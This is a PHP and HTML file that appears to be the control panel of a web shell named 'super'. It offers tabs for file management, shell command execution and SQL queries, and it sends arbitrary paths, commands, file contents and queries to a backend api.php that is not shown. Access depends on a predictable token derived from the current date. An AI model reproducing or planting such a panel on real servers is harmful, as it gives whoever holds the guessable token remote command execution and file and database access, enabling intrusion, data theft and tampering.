<?php

function auth() {
    return md5(base64_encode(date("Y-m-d")));
}

function get($name) {
    return isset($_REQUEST[$name]) ? $_REQUEST[$name] : '';
}

$token = get('token');
if ($token !== auth()) {
    $data = [];
    $data['data'] = ":(";
    echo json_encode($data);
    exit;
}
?><!doctype html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>super</title>
        <link href="style.css"  rel="stylesheet" type="text/css"/>
        <script src="jquery.js"></script>
        <script>
<?php
$data = [];
$data['path'] = getcwd();
$data['token'] = isset($_REQUEST['token']) ? $_REQUEST['token'] : '';
?>
            var sysdata = <?php echo json_encode($data); ?>;
        </script>
    </head>
    <body class="super">
        <div class="toolbar">
            <nav>
                <h2 id="file" class="active">文件管理</h2>
                <h2 id="shell" res="ls">Shell执行</h2>
                <h2 id="sql">SQL查询</h2>
            </nav>

            <div class="form">
                <input />
                <div class="btns">
                    <a id="open" class="btn ">打开</a><a id="save" class="btn">保存</a><a id="exec" class="btn hide">运行</a>
                </div>
            </div>
        </div>
        <textarea></textarea>
        <script>

            (function ($) {
                $("input").bind("keydown", function (e) {
                    var keyc = e.keyCode;
                    if (keyc == 13) {
                        e.preventDefault();

                        $("#exec").trigger("click");
                    }
                });

                $("nav h2").bind("click", function () {
                    $("nav h2.active").attr("res", $("input").val()).attr("data", $("textarea").val());

                    $(this).addClass("active").siblings().removeClass("active");

                    var mode = $("nav h2.active").attr("id");
                    switch (mode) {
                        case 'file' :
                            $(".btns .btn").removeClass("hide");
                            $("#exec").addClass("hide");
                            break;
                        case 'shell':

                        case 'sql':
                            $(".btns .btn").removeClass("hide");
                            $("#open,#save").addClass("hide");
                            break;
                    }

                    $("input").val($(this).attr("res"));
                    $("textarea").val($(this).attr("data"));
                });

                $("div.form input").val(sysdata.path);

                $("#open").bind("click", function () {
                    var data = {};

                    data.action = "open";
                    data.res = $("input").val();
                    data.token = sysdata.token;
                    $.post("api.php", data, function (result) {
                        $("textarea").val(result.data);
                    }, "json");
                });

                $("#exec").bind("click", function () {
                    var data = {};
                    data.action = $("nav h2.active").attr("id");
                    data.res = $("input").val();
                    data.token = sysdata.token;
                    $.post("api.php", data, function (result) {
                        if (data.action == 'shell') {
                            $("textarea").val(result + "\r\n" + $("textarea").val());
                        } else {
                            $("textarea").val(result);
                        }
                    });
                });

                $("#save").bind("click", function () {
                    var data = {};

                    data.action = "save";
                    data.res = $("input").val();
                    data.data = $("textarea").val();
                    data.token = sysdata.token;
                    $.post("api.php", data, function (result) {
                        alert(result.data);
                    }, "json");
                });
            })(jQuery);
        </script>
    </body>
</html>